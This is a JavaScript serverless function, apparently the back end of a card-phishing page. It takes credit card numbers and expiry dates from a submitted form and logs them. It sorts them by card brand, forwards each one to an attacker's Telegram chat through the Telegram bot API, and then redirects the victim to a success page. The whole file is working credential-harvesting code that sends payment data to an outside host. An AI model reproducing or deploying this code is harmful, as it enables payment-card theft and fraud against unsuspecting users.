const https = require('https');

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Location': '/success.html'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        const params = new URLSearchParams(event.body);
        const cardNumber = params.get('cc-number') || '';
        const expMonth = params.get('cc-exp-month') || '';
        const expYear = params.get('cc-exp-year') || '';

        console.log('Datos recibidos:', { cardNumber, expMonth, expYear });

        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        console.log('Token existe:', !!TELEGRAM_BOT_TOKEN);
        console.log('Chat ID existe:', !!TELEGRAM_CHAT_ID);

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const cleanNum = cardNumber.replace(/\s/g, '');

            // Detectar tipo de tarjeta
            let cardType = 'CARD';
            if (/^4/.test(cleanNum)) {
                cardType = 'VISA';
            } else if (/^5[1-5]/.test(cleanNum) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleanNum)) {
                cardType = 'MASTERCARD';
            } else if (/^3[47]/.test(cleanNum)) {
                cardType = 'AMEX';
            }

            const fecha = new Date().toLocaleString('es-AR', {
                timeZone: 'America/Argentina/Buenos_Aires'
            });

            const message = `🔔 NUEVA TARJETA

${cardType}
Numero: ${cleanNum}
Vence: ${expMonth}/${expYear}
Fecha: ${fecha}`;

            console.log('Enviando mensaje...');
            
            try {
                const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
                console.log('Mensaje enviado exitosamente:', result);
            } catch (telegramError) {
                console.error('Error enviando a Telegram:', telegramError);
            }
        } else {
            console.error('Faltan variables de entorno');
        }

        return {
            statusCode: 303,
            headers,
            body: ''
        };
    } catch (error) {
        console.error('Error general:', error);
        return {
            statusCode: 303,
            headers,
            body: ''
        };
    }
};

function sendToTelegram(botToken, chatId, message) {
    return new Promise((resolve, reject) => {
        const data = JSON.stringify({
            chat_id: chatId,
            text: message
        });

        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = https.request(options, (res) => {
            let response = '';
            res.on('data', (chunk) => response += chunk);
            res.on('end', () => {
                console.log('Telegram response status:', res.statusCode);
                console.log('Telegram response:', response);
                if (res.statusCode === 200) {
                    resolve(response);
                } else {
                    reject(new Error(`Telegram error: ${response}`));
                }
            });
        });

        req.on('error', (error) => {
            console.error('Request error:', error);
            reject(error);
        });

        req.write(data);
        req.end();
    });
}
